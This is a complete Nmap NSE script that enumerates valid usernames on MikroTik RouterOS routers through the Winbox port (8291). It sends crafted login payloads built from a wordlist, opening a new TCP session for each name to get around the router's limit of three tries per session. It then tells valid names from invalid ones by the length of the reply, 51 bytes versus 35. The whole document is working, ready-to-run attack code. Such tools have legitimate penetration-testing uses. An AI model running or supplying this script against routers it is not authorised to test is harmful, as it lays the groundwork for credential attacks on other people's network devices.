description = [[
Attempts to enumerate valid usernames on MikroTik devices running the Winbox service on port 8291 in MikroTik-RouterOS.

This script takes a wordlist from the user and modifies a baseline payload by
adding the username to it. If the server responds with 35 bytes, the username
is invalid; if the response is 51 bytes, the username is valid.
]]

author = "deauther890"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "discovery"}

---@usage
-- nmap -p 8291 --script mikrotik-routeros-username-brute  --script-args=wordlist=<wordlist path>  <target>
-- @args mikrotik-routeros-username-brute.wordlist A file with usernames to try, one per line.

--@Note
-- This script uses a new tcp session for every username because the router
-- doesn't respond to usernames after sending 3 tries within the same tcp session!

-- Import required libraries
local io = require "io"
local table = require "table"
local oops = require "oops"
local shortport = require "shortport"
local nmap = require "nmap"
local stdnse = require "stdnse"
local string = require "string"

-- Define the port rule
portrule = shortport.port_or_service(8291, "winbox", "tcp")

-- Define the Driver for socket handling
Driver = {
  new = function(self, host, port)
    local o = { host = host, port = port }
    setmetatable(o, self)
    self.__index = self
    return o
  end,

  connect = function(self)
    self.s = nmap.new_socket()
    self.s:set_timeout(stdnse.get_timeout(self.host))
    return self.s:connect(self.host, self.port, "tcp")
  end,

  send_payload = function(self, payload)
    local try = nmap.new_try(function() return false end)
    try(self.s:send(payload))
    return try(self.s:receive_bytes(35))
  end,

  disconnect = function(self)
    if self.s then
      self.s:close()
    end
  end,
}

-- Read usernames from a wordlist file provided by the user
local function read_wordlist(file_path)
  local wordlist = {}
  local f, err = io.open(file_path, "r")

  if not f then
    stdnse.print_debug("Error opening wordlist: %s", err)
    return nil
  end

  for line in f:lines() do
    table.insert(wordlist, line:match("^%s*(.-)%s*$")) -- Remove leading and trailing whitespaces
  end

  f:close()
  return wordlist
end

-- Function to create the payload
local function create_payload(username)
  local payload = username .. "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  return string.char(#payload) .. "\x06" .. payload

end

local wordlist_path = stdnse.get_script_args(SCRIPT_NAME .. ".wordlist")
-- Main action function
action = function(host, port)
  if not wordlist_path then
    return oops.err("No wordlist provided. Use --script-args=".. SCRIPT_NAME .. ".wordlist=<file>")
  end

  local usernames = read_wordlist(wordlist_path)
  if not usernames then
    return "Failed to read the wordlist."
  end

  local valid_usernames = {}

  local driver = Driver:new(host, port)

  local retry = 0
  for _, username in ipairs(usernames) do
    ::try_again::
    if not driver:connect() then
      if retry <= 0 then
        return "Failed to connect to the target."
      end
      stdnse.print_debug("Failed to reconnect for username: %s", username)
      retry = retry - 1
      stdnse.sleep(0.5)
      goto try_again
    else
      retry = 1
      local payload = create_payload(username)
      stdnse.print_debug("Sending payload for username: %s", username)
      local success, response = pcall(driver.send_payload, driver, payload)
      if success and response then
        local response_length = #response
        stdnse.print_debug("Response length for username %s: %d", username, response_length)
        if response_length == 51 then
          table.insert(valid_usernames, username)
        end
      end
      stdnse.sleep(0.5) -- Delay between requests
      -- Terminate the current connection and attempt to reconnect
      driver:disconnect()
    end
  end

  driver:disconnect()

  if #valid_usernames > 0 then
    return valid_usernames
  else
    return "No valid usernames found."
  end
end
